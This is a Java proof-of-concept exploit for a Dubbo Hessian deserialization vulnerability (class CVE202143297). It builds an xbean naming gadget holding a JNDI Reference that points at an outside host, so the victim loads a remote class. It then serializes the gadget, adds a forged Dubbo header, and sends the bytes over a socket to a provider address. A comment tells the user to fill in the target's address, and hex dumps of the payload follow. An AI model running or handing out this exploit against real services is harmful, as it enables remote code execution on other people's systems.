package com.arliya.dubbo.main;

import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import org.apache.dubbo.common.io.Bytes;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;

import javax.naming.Context;
import javax.naming.Reference;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

public class CVE202143297 {
    public static void main(String[] args) throws Exception {

        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        Reference ref = new Reference("Foo", "Foo","http://testt.dns.9b5501a3.axss.xyz/");
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", ref, ctx);

//        Field fullName = binding.getClass().getSuperclass().getSuperclass().getDeclaredField("fullName");
//        fullName.setAccessible(true);
        Reflections.setFieldValue(binding, "fullName", "<<<<<");
//        fullName.set(binding, "<<<<<");  // 方便定位属性值的



        //############################################################################################
        // 写入binding
        ByteArrayOutputStream binding2bytes = new ByteArrayOutputStream();
        Hessian2Output outBinding = new Hessian2Output(binding2bytes);
        outBinding.writeObject(binding);
        outBinding.flushBuffer();
        //############################################################################################
        // binding序列化后的byte数组
        byte[] bindingBytes = binding2bytes.toByteArray();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        // 在header中记录 序列化对象 的长度，因为最后一个F被覆盖了，所以要-1
        Bytes.int2bytes(bindingBytes.length*2-1, header, 12);

        // 收集header+binding
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(bindingBytes);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        //############################################################################################
        // 组装payload = header+binding+binding
        System.out.println(bytes.length);
        byte[] payload = new byte[bytes.length + bindingBytes.length -1];
        for (int i = 0; i < bytes.length; i++) {
            payload[i] = bytes[i];
        }

        for (int i = 0; i < bindingBytes.length; i++) {
            payload[i + bytes.length-1] = bindingBytes[i];
        }
        //############################################################################################


        // 输出字节流的十六进制
        System.out.println(new String(payload));
        StringBuilder sb = new StringBuilder();
        for (byte b : payload) {
            sb.append(String.format("%02x", b));
        }
        System.out.println(sb);

        //todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(payload);
        outputStream.flush();
        outputStream.close();
        System.out.println("\nsend!!");
//        Hessian2Input
    }
}

//687474703a2f2f3132372e302e302e312ff
//dabb a2 000000000004ffa9a10000045d43303b6f72672e6170616368652e786265616e2e6e616d696e672e636f6e746578742e436f6e746578745574696c24526561644f6e6c7942696e64696e679808626f756e644f626a07636f6e746578740576616c756505697352656c0866756c6c4e616d6509636c6173734e616d65046e616d650a697352656c61746976656043166a617661782e6e616d696e672e5265666572656e63659405616464727314636c617373466163746f72794c6f636174696f6e0c636c617373466163746f727909636c6173734e616d656170106a6176612e7574696c2e566563746f7211687474703a2f2f3132372e302e302e312f03466f6f03466f6f43302f6f72672e6170616368652e786265616e2e6e616d696e672e636f6e746578742e5772697461626c65436f6e746578749e0d636f6e74657874416363657373157061727365644e616d65496e4e616d6573706163650d6d6173746572436f6e7465787411636f6e7465787446656465726174696f6e08696e6465785265660b62696e64696e67735265660977726974654c6f636b06696e43616c6c0a6d6f6469666961626c650f6e616d65496e4e616d65737061636516617373756d6544657265666572656e6365426f756e6419636865636b44657265666572656e6365446966666572656e7414737570706f72745265666572656e636561626c650f63616368655265666572656e636573624e4e4e4e4e4e4e4e464e46464646519154053c3c3c3c3c4e03666f6f43303b6f72672e6170616368652e786265616e2e6e616d696e672e636f6e746578742e436f6e746578745574696c24526561644f6e6c7942696e64696e679808626f756e644f626a07636f6e746578740576616c756505697352656c0866756c6c4e616d6509636c6173734e616d65046e616d650a697352656c61746976656043166a617661782e6e616d696e672e5265666572656e63659405616464727314636c617373466163746f72794c6f636174696f6e0c636c617373466163746f727909636c6173734e616d656170106a6176612e7574696c2e566563746f72 30 26 687474703a2f2f326170717272346f2e646e732e39623535303161332e617873732e78797a2f 03466f6f03466f6f43302f6f72672e6170616368652e786265616e2e6e616d696e672e636f6e746578742e5772697461626c65436f6e746578749e0d636f6e74657874416363657373157061727365644e616d65496e4e616d6573706163650d6d6173746572436f6e7465787411636f6e7465787446656465726174696f6e08696e6465785265660b62696e64696e67735265660977726974654c6f636b06696e43616c6c0a6d6f6469666961626c650f6e616d65496e4e616d65737061636516617373756d6544657265666572656e6365426f756e6419636865636b44657265666572656e6365446966666572656e7414737570706f72745265666572656e636561626c650f63616368655265666572656e636573624e4e4e4e4e4e4e4e464e46464646519154053c3c3c3c3c4e03666f6f46